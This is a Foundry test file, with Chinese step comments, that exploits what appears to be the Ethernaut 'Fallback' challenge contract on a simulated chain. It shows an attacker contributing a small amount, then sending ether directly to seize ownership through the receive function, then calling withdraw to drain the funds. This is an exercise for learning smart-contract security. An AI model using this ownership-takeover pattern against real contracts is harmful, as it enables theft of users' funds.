pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/Fallback.sol";

contract FallbackTest is Test {
    Fallback public instance;
    address public attacker = makeAddr("attack");

    function setUp() public {
        instance = new Fallback();
        vm.deal(attacker, 1 ether);
        vm.deal(address(instance), 1 ether);
    }

    function testFallbackexp() public {
        vm.startPrank(attacker);
        // 步骤1: 攻击者调用contribute函数，发送0.0005 ether
        instance.contribute{value: 0.0005 ether}();
        assertEq(instance.getContribution(), 0.0005 ether);
        // 断言攻击者的贡献等于0.0005 ether
        assertGt(instance.getContribution(), 0);
        // 断言攻击者的贡献大于0
        // 步骤2: 攻击者直接向合约发送0.0005 ether，触发receive函数
        (bool success, ) = address(instance).call{value: 0.0005 ether}("");
        require(success, "Fallback call failed");   
        assertEq(instance.owner(), attacker);
        // 断言攻击者成为了新的所有者
        // 步骤3: 攻击者调用withdraw函数，提取合约中的所有资金
        instance.withdraw();






        
    }


}